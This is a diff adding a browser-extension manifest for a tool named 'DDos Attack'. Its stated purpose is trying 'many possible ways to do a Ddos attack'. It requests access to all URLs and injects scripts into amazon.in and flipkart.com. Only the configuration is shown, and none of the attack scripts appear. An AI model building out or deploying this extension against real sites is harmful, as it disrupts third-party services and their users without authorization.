@@ -1,0 +1,33 @@
+{
+    "name":"DDos Attack",
+    "description":"Will try many possible ways to do a Ddos attack",
+    "version": "1.0",
+    "permissions":[
+        "activeTab",
+        "tabs",
+        "<all_urls>"
+    ],
+    "background":{
+        "persistent": false,
+        "scripts": ["jquery.js","background.js"]
+        
+    },
+    "icons" :{"128":"icon.png"},
+    "content_scripts":[
+        {
+            "matches": [
+                "http://www.amazon.in/",
+                "https://www.amazon.in/",
+                "https://www.flipkart.com/"
+            ],
+            "js" :["jquery.js","myscript.js"]
+        }
+        
+    ],
+    
+    "browser_action": {
+        "defualt_title": "Lets try some DDos",
+        "default_popup": "popup.html"
+    },
+    "manifest_version": 2
+}
